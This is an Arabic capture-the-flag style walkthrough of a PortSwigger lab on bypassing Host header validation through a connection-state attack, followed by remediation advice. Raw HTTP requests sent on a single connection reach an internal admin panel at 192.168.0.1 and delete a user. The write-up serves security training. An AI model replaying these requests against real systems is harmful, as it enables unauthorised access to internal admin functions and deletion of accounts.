# [Host validation bypass via connection state attack](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)

**`ملاحظة:`** يستند هذا اللاب إلى ثغرات أمنية حقيقية اكتشفها `PortSwigger Research`، ولمزيد من التفاصيل، اطلع على : **[Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks#state)**.
## **`الهدف`**
قم بالوصول إلى لوحة الإدارة الداخلية الموجودة في `192.168.0.1/admin` ثم قم بحذف حساب `carlos`.
## **`خطوات الحل`**
سنقوم بالدخول إلى اللاب وتحويل الطلب إلى `Repeater`
```http
GET / HTTP/1.1
Host: 0ace00dd03671428804c08770029004a.h1-web-security-academy.net
Cookie: session=IN54Z9L4wGUZVFty1nNrddU7UFOZn3dS; _lab=46%7cMCwCFFr4vWUGA%2fVqUbanfXaXSF7K1n%2fPAhR69u06fEUd2QtCVupuUR1fGRE4e4tQ7F3xSmVvD7of%2fRgE56xbRwk0bydcqLrELJrUWjJTKXBhE7tCBYFG1l4boZ8UoEzdFdnmnlYpGwVQNLWJV%2fNQFSx3ErPD8MWP3hHzjS2mR0Go%2bbIye4c%3d
```
ثم نقوم بعمل `Group` ونقوم بعمل `Duplicate` للطلب مرة أخرى ونقوم بتعديله كالتالي:
```http
GET /admin HTTP/1.1
Host: 192.168.0.1
Cookie: session=IN54Z9L4wGUZVFty1nNrddU7UFOZn3dS; _lab=46%7cMCwCFFr4vWUGA%2fVqUbanfXaXSF7K1n%2fPAhR69u06fEUd2QtCVupuUR1fGRE4e4tQ7F3xSmVvD7of%2fRgE56xbRwk0bydcqLrELJrUWjJTKXBhE7tCBYFG1l4boZ8UoEzdFdnmnlYpGwVQNLWJV%2fNQFSx3ErPD8MWP3hHzjS2mR0Go%2bbIye4c%3d
```
ونقوم بإرسالهم في إتصال واحد باستخدام خيار `Send group in sequence (single connection)` وسنجد أن طلب الدخول إلى لوحة التحكم كان ناجحًا، وبعد ذلك نقوم بالضغط على `Mouse left-click` داخل الـ `request` ثم `Open response in browser` ثم نقوم بنسخ الرابط وفتحه في المتصفح، وسنجد حقل فارغ نقوم بكتابة اسم `Carlos` به ونضغط زر `Delete User` ولكن قبلها نقوم بتشغيل الـ `Intercept` لنقوم بإعتراض الطلب وتحويله إلى `repeater` مرة أخرى وإضافته إلى الـ `Group` وإرسال الطلبات مرة أخرى في إتصال واحد لننتهي من حل اللاب.
```http
POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: session=IN54Z9L4wGUZVFty1nNrddU7UFOZn3dS; _lab=46%7cMCwCFFr4vWUGA%2fVqUbanfXaXSF7K1n%2fPAhR69u06fEUd2QtCVupuUR1fGRE4e4tQ7F3xSmVvD7of%2fRgE56xbRwk0bydcqLrELJrUWjJTKXBhE7tCBYFG1l4boZ8UoEzdFdnmnlYpGwVQNLWJV%2fNQFSx3ErPD8MWP3hHzjS2mR0Go%2bbIye4c%3d

csrf=p6UplbPYMwNWiQ93fckEWtvQeGrhoKvA&username=carlos
```

كما يمكن أن نجعل `csrf و username` كمعلمات في الرابط في الطلب وسينجح.
```http
POST /admin/delete?csrf=p6UplbPYMwNWiQ93fckEWtvQeGrhoKvA&username=carlos HTTP/1.1
Host: 192.168.0.1
Cookie: session=IN54Z9L4wGUZVFty1nNrddU7UFOZn3dS; _lab=46%7cMCwCFFr4vWUGA%2fVqUbanfXaXSF7K1n%2fPAhR69u06fEUd2QtCVupuUR1fGRE4e4tQ7F3xSmVvD7of%2fRgE56xbRwk0bydcqLrELJrUWjJTKXBhE7tCBYFG1l4boZ8UoEzdFdnmnlYpGwVQNLWJV%2fNQFSx3ErPD8MWP3hHzjS2mR0Go%2bbIye4c%3d
```

**`ملاحظة:`** قد تحتاج إلى تغيير ترويسة `Connection`  إلى `keep-alive` إذا لم تكن كذلك.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب`** [Host header authentication bypass](./Host-header-authentication-bypass.md)

ويجب فحص كل طلب بشكل مستقل، حيث يتم تهيئة السيرفر الوكيل (مثل `Nginx أو HAProxy أو Apache`) ليقوم بفحص ترويسة `Host` وقواعد التوجيه (Routing rules) لكل طلب HTTP على حدة وليس فقط للطلب الأول في الاتصال.

ويجب على الـ `Front-end` إغلاق الاتصال فوراً إذا اكتشف أن الطلب الثاني في نفس اتصال الـ `TCP` يحمل ترويسة `Host` مختلفة عن الطلب الأول.
